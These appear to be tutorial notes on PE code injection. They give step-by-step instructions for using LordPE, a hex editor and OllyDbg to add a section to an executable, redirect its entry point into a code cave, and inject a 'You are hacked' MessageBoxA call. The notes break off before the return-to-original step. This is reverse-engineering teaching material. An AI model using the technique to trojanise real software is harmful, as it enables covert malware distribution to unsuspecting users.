PE CODE INJECTION
- Open LordPE
- PE Editor-> select executable you want to change-> open 'Sections'
- Right click the last section in the Sections and select: 'add section header'
- this new section can be double clicked and edited- edit the name and change both the raw and virtual size to 00005000 (make sure there are 8digits for hexadecimal)
- select 'ok' then 'save' the changed file then select 'ok'
- now the file header size is changed but it does not match the file description. For that we use XVI32
- open XVI32
- open the changed PE1.exe
- go to the last byte
- edit-> insert string-> Hex-String- '00' -> number of times-5000 -> click 'ok'
- save
- File->exit- now we have added 5000 bytes to the executable
- now the error is gone: header and file size matches

-open OllyDbg and open the new PE1.exe
- 55: PUSH; C3: RETURN - These codes are commonly seen in the start and end of a subroutine in Assembly
- Click 'M' to see the memory map
- Find the part that is Labled with '.Shreeya' which is our added section and right click and copy it's address. In my case it is 00522000 - this is the addess of the code Cave.
- click Window-> select the main CPU thread to return back to the original place
- copy the first 4 bytes from the CALL instruction of the original Entry point and store it in a notepad.
- press space in the call and write "jmp <code cave address>"- this changed the colour to red
- only the call instruction ie the 1st line is changed
- select that line and right click-> copy to executable-> selection
- this opens a new window -> right click anywhere and select -> save file -> name: PE_2
- this new PE_2 does not open on double clicking- because there is nothing at the jump instruction address.

-Open OllyDBG and open the new PE2
- press Fn+F7 to move to the address where the newly added header just started which should be at 00522000 - as mentioned before
- select a big portion starting from this address and move down.
- Right click and fill this huge portion with NOPs by : right click-> binary-> fill with NOPs
- Save this file with the same name as before ie PE2
- to reload Ollydbg go to Debug-> Restart 
- select F7 and you will see the NOPs as inserted at 522000 earlier

- now we want to invoke a message box for this we need to know the structure of MessageBoxA which is an important question even for Exams
- int MessageBoxA(
  [in, optional] HWND   hWnd,
  [in, optional] LPCSTR lpText,
  [in, optional] LPCSTR lpCaption,
  [in]           UINT   uType
);


- Now in the edited PE2 we leave some space from 522000 and select a big chunk of bytes
- Right click and select Binary-> edit
- In the pop up box select the ASCII field and enter a string like "You are hacked" or something.
- then a ASSEMBLY code is inserted in that place.
- Copy the address to the first line of that inserted code as it is from where we will enter our message dialogue box(Add1)
- then go to the top(522000) and pass the parameters to the MessageBoxA by:
	- right click-> assemble-> push 0
	- right click-> assemble-> push <address of the dialoge box(Add1)> 
	- right click-> assemble-> push <address of the dialogue box(Add1)> {you can have some other string and inster that address here}
	- right click-> assemble-> push 0 
	- all parameters have now been passed to the stack so now we need to call the message box
	- go to next line
	- right click-> assemble-> call MessageBoxA
- now select all these changed part -> right click-> copy to the executable
- box will pop up-> right click-> save file as 'PE_3'

- Now we need to connect it to the original file so that after we click 'OK' we return to the original running of the putty.exe
- from the saved
